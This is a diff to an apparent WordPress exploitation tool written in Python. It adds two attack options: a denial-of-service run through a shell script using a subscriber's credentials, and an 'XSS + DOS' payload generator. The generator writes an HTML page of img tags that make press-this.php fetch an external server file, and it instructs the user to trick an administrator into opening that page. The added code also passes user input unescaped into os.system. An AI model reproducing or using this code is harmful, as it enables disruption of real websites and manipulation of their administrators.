@@ -3,6 +3,7 @@
 from bs4 import BeautifulSoup
 import re
 import urllib.request
+import os
 from modules import Support
 
 
@@ -78,6 +79,39 @@ while not(Support.is_valid_number(choice)) or my_list[int(choice)].executable ==
 		choice = input("Please choose which available exploit to execute: ")
 
 choice_num = int(choice)
+print("\n")
+
+#work on the choices http://10.7.152.98:3000/wordpress
+
+# DOS
+if choice_num == 1:
+	print("******************************************************************")
+	print("*        				 DOS attack          					*")
+	print("******************************************************************") 
+	print("In order to perform this exploit, you need at least a subscriber account.")
+	username = input("Insert username: ")
+	password = input("Insert password: ")
+	os.system("sh modules/dos.sh " + url + " " + username + " " + password)
+
+# XSS + DOS 
+elif choice_num == 3:
+	print("******************************************************************")
+	print("*        				 XSS + DOS attack          				*")
+	print("******************************************************************") 
+	print("In order to perform this exploit, you need an external server. Move the foo.txt file that you find in the modules folder on your server.")
+	ipaddress = input("Put here the IP address of the external server: ")
+	wp_url = url + 'wp-admin/'
+	external_server = 'http://10.7.152.98:3000/davidecube_xss/foo.txt'
+	external_parsed = urllib.parse.quote(external_server, safe='')
+	item = '<img src=\'' + url + '/wp-admin/press-this.php?u=' + external_parsed + '&url-scan-submit=Scan&a=b\'>'
+	external_file = open("modules/dos.html", "w")
+	for i in range(25):
+		external_file.write(item)
+
+	print("At this point a file dos.html is generated in the modules folder. Move also this file somewhere.")
+	print("Convince an administrator to visit that webpage. This would perform a DOS attack.")
+
+
 
 
 
